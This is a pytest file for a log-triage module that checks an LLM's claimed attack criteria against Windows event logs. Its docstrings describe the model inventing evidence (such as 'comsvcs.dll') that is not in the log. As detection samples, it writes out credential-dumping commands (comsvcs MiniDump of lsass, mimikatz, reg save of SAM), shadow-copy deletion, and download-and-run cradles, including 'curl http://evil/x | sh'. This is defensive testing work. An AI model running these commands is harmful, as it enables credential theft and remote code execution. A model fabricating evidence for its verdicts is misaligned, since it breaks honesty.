"""The model proposes a criterion; the log decides whether it holds.

Three prompt versions oscillated between two failure modes and no wording
fixed both:

    v2  escalated routine telemetry, pasting criterion text into the summary
    v3  described events correctly and never returned CRITICAL at all
    v4  returns CRITICAL, and claims criteria that are not in the log

The v4 case is the clearest. Shown an EID 4672 SYSTEM logon - a list of
privilege names, nothing else - the model answered "C1 credential access -
comsvcs.dll". There is no comsvcs.dll in that event. It had learned the shape
of the answer rather than checking.

Whether a string is in a log is not a judgement call, so it stopped being the
model's job. These tests need no model, which is the point of moving the
decision into code.
"""
from __future__ import annotations

import types

import pytest

from ai import criteria


def v(observed="", claimed="none", verdict="NOT_CRITICAL", severity="INFO"):
    return types.SimpleNamespace(observed=observed, matched_criterion=claimed,
                                 verdict=verdict, severity=severity)


# --------------------------------------------------------------------------
# The claim that started this
# --------------------------------------------------------------------------

def test_an_unsupported_claim_is_refused():
    """The exact output the model produced on EID 4672."""
    verdict = v(observed="SeAssignPrimaryTokenPrivilege SeTcbPrivilege SeDebugPrivilege",
                claimed="C1 credential access - comsvcs.dll",
                verdict="CRITICAL", severity="CRITICAL")
    note = criteria.apply(verdict, "EID=4672 | S-1-5-18 | SYSTEM | NT AUTHORITY")
    assert verdict.verdict == "NOT_CRITICAL"
    assert note and "none of its markers" in note


def test_a_refused_claim_loses_its_basis_entirely():
    """This dropped to SUSPICIOUS at first, reasoning that the model thought
    *something*. The data refused that: v4 claims a criterion on nearly every
    event, so downgrading to SUSPICIOUS escalated eight of nine benign cases -
    an EID 4672 SYSTEM logon among them.

    The prompt says the verdict follows from the criterion. A reason that is
    false is not a weaker reason; it is no reason.
    """
    verdict = v(claimed="C1", verdict="CRITICAL", severity="CRITICAL")
    criteria.apply(verdict, "nothing relevant here")
    assert verdict.verdict == "NOT_CRITICAL"
    assert verdict.severity == "INFO"


def test_a_supported_claim_is_upheld():
    """The evidence has to be in the log, not in the model's own field - see
    test_the_model_cannot_manufacture_its_own_evidence."""
    verdict = v(observed="rundll32.exe comsvcs.dll, MiniDump 704 lsass.dmp full",
                claimed="C1 credential access", verdict="CRITICAL", severity="CRITICAL")
    log = "CommandLine=rundll32.exe comsvcs.dll, MiniDump 704 lsass.dmp full"
    assert criteria.apply(verdict, log) is None
    assert verdict.verdict == "CRITICAL"


# --------------------------------------------------------------------------
# The log decides which criterion, not only whether
# --------------------------------------------------------------------------

def test_a_misfiled_criterion_is_corrected_not_discarded():
    """On `vssadmin delete shadows` the model claimed C3, evidence
    destruction. The log supports C6. Verifying only the claim would have
    thrown away a real detection because the model filed it wrong."""
    verdict = v(observed="vssadmin.exe delete shadows /all /quiet",
                claimed="C3 evidence destruction", verdict="CRITICAL")
    note = criteria.apply(verdict, "CommandLine=vssadmin.exe delete shadows /all /quiet")
    assert verdict.verdict == "CRITICAL"
    assert "C6" in verdict.matched_criterion
    assert note and "C6" in note


def test_a_criterion_the_model_missed_is_found():
    """It claimed none on a service installed from ADMIN$."""
    verdict = v(observed="service installed from a remote share",
                claimed="none", verdict="SUSPICIOUS")
    criteria.apply(verdict, r"ImagePath=\\10.20.30.41\ADMIN$\mtHKzQrx.exe")
    assert verdict.verdict == "CRITICAL"
    assert "C2" in verdict.matched_criterion


def test_the_raw_log_is_searched_as_well_as_the_observation():
    """`observed` is 180 characters and can legitimately omit a marker."""
    verdict = v(observed="a new process was created", claimed="none")
    criteria.apply(verdict, "CommandLine=vssadmin.exe delete shadows /all /quiet")
    assert verdict.verdict == "CRITICAL"


# --------------------------------------------------------------------------
# Benign events must stay benign
# --------------------------------------------------------------------------

@pytest.mark.parametrize("log", [
    "EID=4672 | S-1-5-18 | SYSTEM | SeDebugPrivilege SeBackupPrivilege",
    "EID=4798 | group membership was enumerated | bash.exe",
    "EID=7040 | start type of the BITS service was changed",
    "EID=4624 | LogonType=5 | services.exe",
])
def test_the_observed_false_positives_match_nothing(log):
    verdict = v(observed=log, claimed="none")
    criteria.apply(verdict, log)
    assert verdict.verdict != "CRITICAL", log


def test_a_privilege_name_is_not_credential_access():
    """SeDebugPrivilege appearing in a log is not evidence of dumping."""
    assert not criteria.supported_by("C1", "SeDebugPrivilege SeTcbPrivilege")


def test_the_word_credential_alone_matches_nothing():
    for tag in criteria.CRITERIA:
        assert not criteria.supported_by(tag, "Logon with explicit credentials")


# --------------------------------------------------------------------------
# Mechanics
# --------------------------------------------------------------------------

@pytest.mark.parametrize("text,expected", [
    ("C1 credential access - comsvcs.dll", "C1"),
    ("c6", "C6"),
    ("matched C3 evidence destruction", "C3"),
    ("none", None),
    ("", None),
    ("C9 something invented", None),
])
def test_the_tag_is_extracted_from_free_text(text, expected):
    """The field is prose - the model writes the name alongside the number."""
    assert criteria.claimed_criterion(text) == expected


def test_every_marker_of_an_alternative_is_required():
    """`reg save HKLM\\SAM` is C1; the word `reg` on its own is not."""
    assert criteria.supported_by("C1", r"reg save HKLM\SAM C:\out.hive")
    assert not criteria.supported_by("C1", r"reg query HKLM\Software")


def test_all_six_criteria_are_reachable():
    """A criterion with no working marker is a detection that can never fire,
    and nothing else would report it."""
    samples = {
        "C1": "comsvcs.dll MiniDump",
        "C2": "wmic /node:10.0.0.5 process call create",
        "C3": "EID=1102 audit log was cleared",
        "C4": r"schtasks /create /tn Updater /tr C:\Users\Public\payload.exe",
        "C5": "powershell -EncodedCommand x DownloadString('http://h/a')",
        "C6": "vssadmin delete shadows /all",
    }
    for tag, sample in samples.items():
        assert criteria.supported_by(tag, sample), tag


def test_no_claim_and_no_support_changes_nothing():
    verdict = v(observed="a routine event", claimed="none", verdict="NOT_CRITICAL")
    assert criteria.apply(verdict, "a routine event") is None
    assert verdict.verdict == "NOT_CRITICAL"


def test_a_supported_criterion_raises_severity_to_at_least_high():
    """The gate needs CRITICAL/HIGH before a CRITICAL verdict surfaces, so
    leaving severity at MEDIUM would file a real detection quietly."""
    verdict = v(observed="mimikatz sekurlsa::logonpasswords", claimed="C1",
                verdict="SUSPICIOUS", severity="MEDIUM")
    criteria.apply(verdict, "CommandLine=mimikatz.exe sekurlsa::logonpasswords")
    assert verdict.severity in ("CRITICAL", "HIGH")


def test_both_callers_use_it():
    """The worker that files the row and the eval that scores the model. They
    drifted apart once already, and the harness reported 40% escalation recall
    on runs where production surfaced nothing."""
    import pathlib
    root = pathlib.Path(__file__).resolve().parent.parent
    for f in ("ai_worker.py", "scripts/run_eval.py"):
        src = (root / f).read_text(encoding="utf-8")
        assert "criteria.apply(" in src, f


# --------------------------------------------------------------------------
# What these markers do and do not demonstrate
# --------------------------------------------------------------------------

def test_the_markers_cover_the_constructed_attacks():
    """8/8 on the corpus, and that number proves less than it looks.

    The markers and the corpus positives were written by the same person from
    the same list of techniques, so matching all of them is close to
    circular - the cases were built around the strings the markers look for.

    The half that is evidence is the negatives: four of them are events this
    deployment actually produced, and none was in view when the markers were
    written. `test_the_observed_false_positives_match_nothing` is the test
    that carries weight.
    """
    import json
    import pathlib

    corpus = (pathlib.Path(__file__).resolve().parent.parent
              / "evals" / "corpus_attacks.jsonl")
    rows = [json.loads(l) for l in corpus.read_text(encoding="utf-8").splitlines()
            if l.strip()]
    positives = [r for r in rows if r["expected"] == "CRITICAL"]
    assert positives, "the corpus has no positives"

    matched = [r for r in positives
               if any(criteria.supported_by(tag, json.dumps(r["event"]))
                      for tag in criteria.CRITERIA)]
    assert len(matched) == len(positives), (
        "attacks with no marker: "
        + ", ".join(r["id"] for r in positives if r not in matched)
    )


def test_no_benign_case_matches_a_marker():
    """The number that is not circular. Four of these are observed events."""
    import json
    import pathlib

    corpus = (pathlib.Path(__file__).resolve().parent.parent
              / "evals" / "corpus_attacks.jsonl")
    rows = [json.loads(l) for l in corpus.read_text(encoding="utf-8").splitlines()
            if l.strip()]
    escalated = [r["id"] for r in rows if r["expected"] == "NOT_CRITICAL"
                 and any(criteria.supported_by(tag, json.dumps(r["event"]))
                         for tag in criteria.CRITERIA)]
    assert not escalated, f"markers fire on benign events: {escalated}"


def test_json_escaping_does_not_hide_a_path():
    r"""The event's `message` is itself a JSON string, so serialising the
    event escapes its backslashes twice and `HKLM\SAM` arrives as four. Both
    `reg save HKLM\SAM` and `C:\Users\Public\svchost.exe` were missed for
    exactly this - the markers were right and the text was a different
    encoding of the same string."""
    import json
    event = {"message": json.dumps({"message": r"reg.exe save HKLM\SAM C:\out.hive"})}
    assert criteria.supported_by("C1", json.dumps(event))


def test_forward_slashes_are_folded():
    """The same path is written both ways depending on the producer."""
    assert criteria.supported_by(
        "C4", "schtasks /create /tr C:/Users/Public/payload.exe")


def test_critical_with_no_basis_at_all_is_downgraded():
    """The prompt makes a criterion the requirement for CRITICAL, so a
    CRITICAL that claims nothing and matches nothing has no stated basis and
    no findable one. A network logon by the backup service came back that way.

    SUSPICIOUS rather than NOT_CRITICAL, unlike a refuted claim: there the
    model gave a reason and the reason was false; here it gave none, and "I
    cannot say why" is weaker evidence than a disproved claim, not stronger.
    """
    verdict = v(observed="network logon by svc_backup from CORP-BKP01",
                claimed="none", verdict="CRITICAL", severity="CRITICAL")
    criteria.apply(verdict, r"EID=4624 LogonType=3 Account=CORP\svc_backup")
    assert verdict.verdict == "SUSPICIOUS"
    assert verdict.severity != "CRITICAL"


def test_a_refuted_claim_falls_further_than_an_absent_one():
    """The two downgrade paths are deliberately different depths."""
    refuted = v(observed="SeDebugPrivilege", claimed="C1", verdict="CRITICAL",
                severity="CRITICAL")
    absent = v(observed="SeDebugPrivilege", claimed="none", verdict="CRITICAL",
               severity="CRITICAL")
    criteria.apply(refuted, "EID=4672 SeDebugPrivilege")
    criteria.apply(absent, "EID=4672 SeDebugPrivilege")
    assert refuted.verdict == "NOT_CRITICAL"
    assert absent.verdict == "SUSPICIOUS"


def test_a_supported_criterion_is_not_touched_by_either_path():
    verdict = v(observed="vssadmin delete shadows /all", claimed="none",
                verdict="NOT_CRITICAL", severity="INFO")
    criteria.apply(verdict, "CommandLine=vssadmin delete shadows /all")
    assert verdict.verdict == "CRITICAL"
    assert verdict.severity in ("CRITICAL", "HIGH")


def test_a_run_key_into_appdata_is_not_forced_to_critical():
    """`appdata` was a C4 marker on its own. Slack, Teams and Dropbox each
    install a Run key pointing into AppData, so every one of them matched
    persistence-to-a-writable-path and came out CRITICAL.

    Removing it cost nothing measurable - all eight attack cases still match a
    criterion - and a Run key into AppData is still worth a look. That is a
    judgement, which is the model's half of this.
    """
    assert not criteria.supported_by(
        "C4", r"TargetObject=HKLM\...\Run\Updater Details=C:\Users\jdoe\AppData\Roaming\updater.exe")


def test_a_writable_path_needs_a_mechanism_beside_it():
    """A path is a location. Persistence is something that will run again, and
    this criterion used to accept the first as evidence of the second.

    Windows Error Reporting writes its crash dumps under
    `C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\`, which matched both
    `programdata` and `\\temp\\`. Three of the ten real events in the corpus
    were being forced to CRITICAL by a desktop reporting that something had
    crashed - and a forced criterion bypasses the confidence gate, so each one
    went to an analyst.
    """
    for path in (r"C:\Users\Public\svchost.exe",
                 r"C:\Windows\Temp\payload.exe",
                 r"C:\ProgramData\x.exe"):
        assert not criteria.supported_by("C4", path), path

    for mechanism in (r"schtasks /create /tr C:\Users\Public\svchost.exe",
                      r"HKLM\Software\...\CurrentVersion\Run\x = C:\Windows\Temp\p.exe",
                      r"A service was installed ImagePath=C:\Users\Public\s.exe"):
        assert criteria.supported_by("C4", mechanism), mechanism


def test_a_crash_dump_is_not_persistence():
    """The observed event that made the point, kept close to verbatim."""
    wer = (r"[Windows Error Reporting] EID=1001 | LiveKernelEvent | "
           r"\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER.cf3a2b91.tmp.xml")
    assert not criteria.supported_by("C4", wer)


def test_the_model_cannot_manufacture_its_own_evidence():
    """`observed` was in the haystack at first, on the reasoning that the log
    might be truncated. That is backwards: `observed` is derived from the log
    and can hold nothing the log does not, so including it meant the model
    could write "comsvcs.dll" into a field and have the check confirm that
    "comsvcs.dll" appears.

    It is what let CRITICAL survive on a backup service's network logon.
    """
    verdict = v(observed="rundll32 comsvcs.dll MiniDump lsass.dmp",
                claimed="C1", verdict="CRITICAL", severity="CRITICAL")
    criteria.apply(verdict, r"EID=4624 LogonType=3 Account=CORP\svc_backup")
    assert verdict.verdict != "CRITICAL", (
        "the model's own text validated its claim"
    )


def test_a_real_marker_in_the_log_still_matches_without_observed():
    verdict = v(observed="", claimed="none", verdict="NOT_CRITICAL")
    criteria.apply(verdict, "CommandLine=rundll32 comsvcs.dll, MiniDump 704 x.dmp")
    assert verdict.verdict == "CRITICAL"


# --------------------------------------------------------------------------
# Reading the payload rather than the wrapper
# --------------------------------------------------------------------------

def _enc(script: str) -> str:
    """A PowerShell -EncodedCommand, encoded the way PowerShell encodes it."""
    import base64
    return "powershell.exe -nop -w hidden -enc " + base64.b64encode(
        script.encode("utf-16-le")).decode()


def test_encoding_alone_is_not_the_indicator():
    """This estate's own management tooling ran an encoded command on an
    ordinary afternoon, and the criterion forced it to CRITICAL - which then
    bypasses the confidence gate and reaches an analyst.

    A developer decoding a config string is the same shape. Both are in the
    corpus, and the flag cannot tell them apart because the flag is not what
    differs.
    """
    assert not criteria.supported_by("C5", _enc("Get-Date; Write-Host hello"))
    assert not criteria.supported_by(
        "C5", "[Convert]::FromBase64String($env:APP_CONFIG)")


def test_a_cradle_inside_the_payload_is_found():
    """What actually separates the two: one of them fetches and runs remote
    code. That is only visible after decoding, which is the entire reason
    -EncodedCommand is used."""
    assert criteria.supported_by(
        "C5", _enc("IEX (New-Object Net.WebClient).DownloadString('http://h/a.ps1')"))


def test_the_decoder_ignores_things_that_merely_look_like_base64():
    """GUIDs, hashes and hex dumps fill these logs. Decoding them yields
    mojibake, and mojibake in the haystack can coincide with a marker."""
    noise = ("22feb12c-e7ce-4ccb-8f8b-f10fa2f43e90 ffffe68b1db70370 "
             "fffff8053b00b6a0 " + "a1b2c3d4" * 12)
    decoded = criteria.decoded_payload(noise)
    assert "downloadstring" not in decoded.lower()


def test_the_decoder_is_bounded():
    """A log line can be very long and this runs on every event."""
    import base64
    blob = base64.b64encode(b"DownloadString http://x " * 4).decode()
    assert criteria.decoded_payload(" ".join([blob] * 200))


def test_utf8_payloads_decode_too():
    """PowerShell is UTF-16LE; everything on Linux is not."""
    import base64
    blob = base64.b64encode(b"curl http://evil/x | sh").decode() + "AAAA"
    assert "curl" in criteria.decoded_payload(blob)
